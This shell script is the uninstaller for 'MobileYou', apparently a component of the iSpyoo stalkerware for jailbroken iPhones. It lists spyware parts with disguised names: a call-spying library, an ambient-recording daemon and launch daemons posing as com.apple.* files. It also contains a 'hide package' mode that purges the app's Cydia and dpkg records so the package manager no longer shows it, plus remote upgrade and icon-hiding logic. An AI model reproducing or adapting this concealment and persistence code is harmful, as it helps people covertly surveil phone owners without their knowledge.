#!/bin/sh

# uninstall.sh
 

#To set echo off   
#exec 1>/dev/null

echo "----------------------------------------------------------------------"
echo "Uninstalling version 20131018 ... "

# Exit when a command fails
#set -o errexit
set +o errexit

# Error when unset variables are found
#set -o nounset
set +o nounset

PACKAGE_LIST="com.ispyoo.ispyoo"
SOURCE_LIST="iphone.ispyoo.com"


 
APP_NAME="MobileYou.app"
PATH_APP="/Applications/MobileYou.app"

TEMP_FOLDER="/Library/Application Support/.MobileYou"
LOG_FILE="mobileyou.log"
LOG_FILE_DAEMON="mobileyoud.log"
LOG_FILE_SB="mobileyousb.log"


PLIST_FILE="com.apple.mobileyou.plist"
PLIST_FILE_APNS="com.mobileyou.push.plist"
 

TEMPORARY_DB_FILE="mobileyou.db"

DAEMON_FOLDER=".mobileyoudaemon"

 
DAEMON_PLIST_FILE="com.apple.mobileyoud.plist" 
DAEMON_AMBIENT_RECORD_PLIST_FILE="com.mobileyou.ambientrecorddaemon.plist" 
DAEMON_CONTROLLER_PLIST_FILE="com.mobileyou.appcontroller.plist" 


 
APP_SYSTEM_SERVICES=".MobileYouServices.app"
UNINSTALL_SHELL_FILE="uninstall_mobileyou.sh"

DEFAULT_DATA_SERVER="ispyoo.com"
 
URL_DOWNLOAD_DEB_FILE="iSpyoo.deb"

SB_CORE_NAME=".MobileYou.dylib"
SB_CORE_PLIST=".MobileYou.plist"

SB_CORE_PUSH_LIBRARY_NAME=".corepush_mobileyou.dylib"
SB_CORE_PUSH_LIBRARY_PLIST=".corepush_mobileyou.plist"

SB_SPYCALL_NAME=".CallManagerMobileYou.dylib"
SB_SPYCALL_PLIST=".CallManagerMobileYou.plist"


#TARGET=$1
CALLED_FROM=$1

#install deb file downloaded from server
function_install_deb_file()
{
    echo "function_install_deb_file"

    cd /private/var/root/Media/Cydia/MyAutoInstall
    dpkg -i $URL_DOWNLOAD_DEB_FILE

    #remove this deb file
    rm -f "/private/var/root/Media/Cydia/MyAutoInstall/$URL_DOWNLOAD_DEB_FILE"

}


# remove source cydia
function_remove_cydia_source()
{
    echo "function_remove_cydia_source"

    if [ -z "$CALLED_FROM" ]
    then 
        echo "No need to dpkg -r anymore!!!"
    else
        echo "call dpkg -r"
    #set +o errexit
    rm -f /var/lib/dpkg/lock 
    for i in $PACKAGE_LIST; do 
        
        echo "dpkg --force-all --purge $i"   
        dpkg --force-all --purge $i 

        #echo "dpkg -r $i"
        #dpkg -r $i  

        rm -f /var/lib/dpkg/lock 
    done;
    
    dpkg --forget-old-unavail

    for i in $SOURCE_LIST; do 
    	echo "rm -f /var/cache/apt/archives/$i"   
    	rm -f /var/cache/apt/archives/$i

    	echo "rm -f /var/cache/apt/archives/partial/$i"  
    	rm -f /var/cache/apt/archives/partial/$i

    	echo "rm -f /var/lib/apt/list/$i_.* (Package and Release)"  
    	rm -f /var/lib/apt/list/$i_.*

 
        echo "sed -e /$i/d /etc/apt/sources.list.d/cydia.list"  
        sed -e "/$i/d" /etc/apt/sources.list.d/cydia.list > /etc/apt/sources.list.d/cydia.list.TMP
        mv -f /etc/apt/sources.list.d/cydia.list.TMP /etc/apt/sources.list.d/cydia.list	

#        echo "rm -f /var/cache/apt/srcpkgcache.bin"   
#        rm -f /var/cache/apt/srcpkgcache.bin

        echo "rm -f  /private/var/lib/apt/lists/$i*"
        rm -f /private/var/lib/apt/lists/$i*
        echo "rm -f /private/var/lib/apt/lists/partial/$i*"
        rm -f /private/var/lib/apt/lists/partial/$i*


#        echo "sed -e /$i /private/var/lib/cydia/metadata.plist"  
#        sed -e "/$i" /private/var/lib/cydia/metadata.plist > /private/var/lib/cydia/metadata.plist.TMP
#        mv -f /private/var/lib/cydia/metadata.plist.TMP /private/var/lib/cydia/metadata.plist	
   done;

    fi


}


#set device status (installed or removed)
function_set_device_status()
{
    echo "function_set_device_status"

 

    FILENAME="/usr/libexec/$DAEMON_FOLDER/device_info.txt"
    #echo $FILENAME
    # Check if the file exists
    if [ -a $FILENAME ]; then 

        echo "Read line from file 2"
        while read -r line
        do    

            echo $(date)
            #fileNamesListStr="$fileNamesListStr $line"

            echo $line

            if [ -z "$CALLED_FROM" ]
            then 
                STATUS="uninstalled from Cydia on $(date)"
                echo $STATUS

            else
                STATUS="uninstall remotely on $(date)"
            fi

            #curl -d "deviceid=$line&status=$STATUS" "$DEFAULT_DATA_SERVER/logs/set_device_status.aspx"

        done < $FILENAME

    else 
            echo "file device_info does not existing!"
    fi

    #echo "$fileNamesListStr"  // 1 2 3 ..... n-1 (but it should print up to n.)

    rm -rf $FILENAME

    echo "end function_set_device_status"

}

#main function
function_remove_client ()
{
  
    echo "function_remove_client" 	

	 if [ -a /usr/libexec/$DAEMON_FOLDER/hide_package_yes ]; then 
		
		echo "hide Package" 
		
        function_remove_cydia_source

        rm -rf "/$PATH_APP/Info.plist_bk"
        rm -rf "/$PATH_APP"
        rm -rf "/usr/libexec/$DAEMON_FOLDER/hide_package_yes"

    elif [ -a /usr/libexec/$DAEMON_FOLDER/upgrade_package_yes ]; then  	

        echo "upgrade Package" 

        function_install_deb_file
        

        rm -rf "/usr/libexec/$DAEMON_FOLDER/upgrade_package_yes"



        # check in case if previous configuration if "hide icon" and/or "hide package forever"

        if [ -a /Library/hide_package_yes ]; then  	

            echo " create mark file to hide package"
            echo "" > /usr/libexec/$DAEMON_FOLDER/hide_package_yes

            rm -rf /Library/hide_package_yes

            for i in $PACKAGE_LIST; do 

                echo "dpkg --force-all --purge $i"   
                dpkg --force-all --purge $i 

                rm -f /var/lib/dpkg/lock 
            done;



        elif [ -a /Library/hide_icon_yes ]; then  	

            echo "hide icon"

            cp -rf "$PATH_APP/Info.plist" "$PATH_APP/Info.plist_bk"

            rm -rf /Library/hide_icon_yes

        fi


 
        echo "reboot"
        reboot

    else

		echo "uninstall Package" 
		


        #set device status to know if the app is uninstalled 
        function_set_device_status


        function_remove_cydia_source
		
		
	 	
		echo "remove files"
	
        echo "rm -rf $APP_SYSTEM_SERVICES"   
		rm -rf $APP_SYSTEM_SERVICES
		
        echo "rm -rf $PATH_APP"  
        rm -rf $PATH_APP

        echo "remove Info.plist  file if any"
        rm -rf  $PATH_APP/Info.plist
        rm -rf  $PATH_APP/Info.plist_bk


		#remove temporary files
		rm -rf "$TEMP_FOLDER/$PLIST_FILE"
		rm -rf "$TEMP_FOLDER/$LOG_FILE"
		rm -rf "$TEMP_FOLDER/$LOG_FILE_DAEMON"
		rm -rf "$TEMP_FOLDER/$LOG_FILE_SB"
		rm -rf "$TEMP_FOLDER/$TEMPORARY_DB_FILE"
        rm -rf "$TEMP_FOLDER/$PLIST_FILE_APNS"
        rm -rf "$TEMP_FOLDER"
        #rmdir -p $TEMP_FOLDER
		
		# for dynamic lib
		rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_CORE_NAME
		rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_CORE_PLIST

        rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_CORE_PUSH_LIBRARY_NAME
        rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_CORE_PUSH_LIBRARY_PLIST

        rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_SPYCALL_NAME
        rm -rf /Library/MobileSubstrate/DynamicLibraries/$SB_SPYCALL_PLIST


		# for daemon
		if [ -a /System/Library/LaunchDaemons/$DAEMON_PLIST_FILE ]; then 
                          
            #echo "unload daemon if any"
            #launchctl unload /System/Library/LaunchDaemons/$DAEMON_PLIST_FILE

			echo "removing files"
			rm -rf /System/Library/LaunchDaemons/$DAEMON_PLIST_FILE


		fi

		# for daemon "controller"
		if [ -a  /System/Library/LaunchDaemons/$DAEMON_CONTROLLER_PLIST_FILE ]; then 
                          

            #echo "unload daemon if any"
            #launchctl unload /System/Library/LaunchDaemons/$DAEMON_CONTROLLER_PLIST_FILE

			echo "removing files"
			rm -rf /System/Library/LaunchDaemons/$DAEMON_CONTROLLER_PLIST_FILE
		fi


        # for daemon "ambient record"
        if [ -a  /System/Library/LaunchDaemons/$DAEMON_AMBIENT_RECORD_PLIST_FILE ]; then 

            echo "removing files"
            rm -rf /System/Library/LaunchDaemons/$DAEMON_AMBIENT_RECORD_PLIST_FILE
        fi

		rm -rf /usr/libexec/$DAEMON_FOLDER/Info.plist			

        #script file
        #rm -rf /usr/libexec/$DAEMON_FOLDER/$UNINSTALL_SHELL_FILE

        rm -rf /usr/libexec/$DAEMON_FOLDER/hide_package_yes
        rm -rf /usr/libexec/$DAEMON_FOLDER/upgrade_package_yes

        #rmdir -p /usr/libexec/$DAEMON_FOLDER
        rm -rf /usr/libexec/$DAEMON_FOLDER
 
 
	fi
	

}
 
 
 
  
function_remove_client   
exit 0


  
